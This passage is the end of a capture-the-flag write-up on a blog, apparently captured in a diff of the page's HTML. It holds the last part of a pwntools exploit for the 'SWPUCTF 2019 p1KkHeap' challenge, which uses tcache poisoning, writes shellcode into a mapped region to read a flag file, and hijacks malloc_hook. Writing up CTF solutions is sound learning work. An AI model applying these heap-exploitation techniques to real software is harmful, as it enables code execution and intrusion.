class="built_in">print</span>(<span class="built_in">hex</span>(tache_addr))</span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(tache_addr)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#4</span></span><br><span class="line">vmmap=<span class="number">0x66660000</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0xb8</span>*<span class="string">&#x27;\x00&#x27;</span>+p64(vmmap))</span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#5</span></span><br><span class="line">shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,<span class="number">0x66660300</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,<span class="number">0x66660300</span>,<span class="number">0x30</span>)</span><br><span class="line">edit(<span class="number">5</span>,asm(shellcode))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">malloc_hook=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x70</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"><span class="comment">#dele(0)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0xb8</span>*<span class="string">&#x27;\x00&#x27;</span>+p64(malloc_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#6</span></span><br><span class="line">edit(<span class="number">6</span>,p64(vmmap))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">buu</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2023/10/29/SWPUCTF-2019-p1KkHeap/">展开全文 >></a>
     </p>
     
 
